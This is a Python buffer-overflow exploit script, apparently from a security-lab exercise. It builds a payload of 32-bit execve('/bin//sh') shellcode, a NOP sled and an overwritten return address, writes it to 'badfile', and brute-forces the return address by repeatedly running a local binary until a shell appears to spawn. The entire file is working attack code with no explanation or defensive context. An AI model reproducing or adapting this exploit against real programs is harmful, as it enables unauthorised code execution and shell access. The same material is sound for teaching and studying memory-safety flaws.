#!/usr/bin/python3

import sys
def get_content(num):
	# Replace the content with the actual shellcode
	shellcode= (
	  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
	).encode('latin-1')

	# Fill the content with NOP's
	content = bytearray(0x90 for i in range(517)) 

	##################################################################
	# Put the shellcode somewhere in the payload

	# Decide the return address value 
	# and put it somewhere in the payload
	ret    = 0xffffccc8+ num           # Change this number 
	offset1 = 311+4              # Change this number
	L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
	content[offset1:offset1 + L] = (ret).to_bytes(L,byteorder='little')

	start = offset1 - len(shellcode)               # Change this number 
	content[start:start + len(shellcode)] = shellcode

	# a = -42
	a = 4293848836
	b = "\x11\x11\x11\x00"
	# offset1 -> ret pos
	
	offset1+=L
	# offset1 -> str

	offset1+=L
	# -> a
	content[offset1:offset1 + L] = (a).to_bytes(L,byteorder='little')

	offset1+=L
	# -> b
	content[offset1:offset1 + L] = (b).encode('latin-1')

	offset1+=L
	content = content[0:offset1]
	print(content)
	##################################################################
	return content

import os,time,sys

if len(sys.argv) == 1:

	for i in range(180,2001):
		# Write the content to a file
		with open('badfile', 'wb') as f:
		  f.write(get_content(i))
		print("i=",i)
		s=time.time()
		# os.system("./B1-gdb")
		import subprocess
		subprocess.call(['./B1'])
		if time.time() -s > 1.0:
			break
else:
	with open('badfile', 'wb') as f:
		f.write(get_content(int(sys.argv[1])))
